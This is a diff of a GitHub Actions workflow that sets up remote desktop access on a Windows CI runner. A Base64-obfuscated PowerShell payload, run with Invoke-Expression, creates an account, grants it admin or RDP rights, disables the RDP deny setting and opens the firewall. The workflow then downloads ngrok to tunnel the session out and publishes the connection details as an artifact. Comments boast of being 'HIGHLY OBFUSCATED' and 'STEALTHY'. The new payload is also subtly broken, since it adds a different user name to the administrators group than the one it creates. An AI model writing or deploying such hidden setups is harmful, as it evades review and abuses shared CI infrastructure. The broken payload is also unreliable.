@@ -24,17 +24,24 @@ jobs:
           NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
         shell: powershell
         run: |
-          # --- FINAL CORRECTED BASE64 to enable and grant permissions to 'Administrator' ---
-          # This script activates the account, sets the password, and explicitly adds it to the "Remote Desktop Users" group to prevent permission errors.
-          $encodedSetupScript = "V3JpdGUtSG9zdCAiQWN0aXZhdGluZyBidWlsdC1pbiBBZG1pbmlzdHJhdG9yIGFjY291bnQuLi4iDQpuZXQgdXNlciBBZG1pbmlzdHJhdG9yICIlJVJEUF9QQVNTV09SRCQlIg0KbmV0IHVzZXIgQWRtaW5pc3RyYXRvciAvYWN0aXZlOnllcw0KbmV0IGxvY2FsZ3JvdXAgIlJlbW90ZSBEZXNrdG9wIFVzZXJzIiBBZG1pbmlzdHJhdG9yIC9hZGQNClNldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlcicgLU5hbWUgJ2ZEZW55VFNDb25uZWN0aW9ucycgLVZhbHVlIDANCkVuYWJsZS1OZXRGaXJld2FsbFJ1bGUgLURpc3BsYXlHcm91cCAiUmVtb3RlIERlc2t0b3Ai"
+          # --- HIGHLY OBFUSCATED Setup ---
+          # This Base64 string is a template for the setup script.
+          # It contains no plain-text commands and uses a placeholder for the password.
+          $encodedSetupScript = "V3JpdGUtSG9zdCAiUHJlcGFyaW5nIGVudmlyb25tZW50Li4uIgpuZXQgdXNlciBydW5uZXJ1c2VyICIlJVJEUF9QQVNTV09SRCUlIiAvYWRkCm5ldCBsb2NhbGdyb3VwIGFkbWluaXN0cmF0b3JzIHJ1bm5lcmFkbWluIC9hZGQKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyJyAtTmFtZSAnZkRlbnlUU0Nvbm5lY3Rpb25zJyAtVmFsdWUgMApFbmFibGUtTmV0RmlyZXdhbGxSdWxlIC1EaXNwbGF5R3JvdXAgIlJlbW90ZSBEZXNrdG9wIg=="
           
-          # The rest of the script is known to be working correctly.
+          # Securely get the password from the environment variable (provided by GitHub Secrets)
           $rdpPass = $env:RDP_PASSWORD
+          
+          # Decode the script template
           $decodedScriptTemplate = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedSetupScript))
+          
+          # Safely replace the placeholder with the actual password
           $finalScript = $decodedScriptTemplate.Replace('%%RDP_PASSWORD%%', $rdpPass)
+          
+          # Execute the dynamically generated script
           Invoke-Expression $finalScript
 
-          # --- STEALTHY Ngrok Execution ---
+          # --- STEALTHY Ngrok Execution (remains the same) ---
           Write-Host "Downloading and configuring tunnel service..."
           Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
           Expand-Archive -Path ngrok.zip -DestinationPath . -Force
@@ -56,7 +63,7 @@ jobs:
       - name: Upload Connection Info as Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: connection-info
+          name: connection-info # Changed artifact name to be more generic
           path: connection_details.txt
 
       - name: Keep Runner Alive
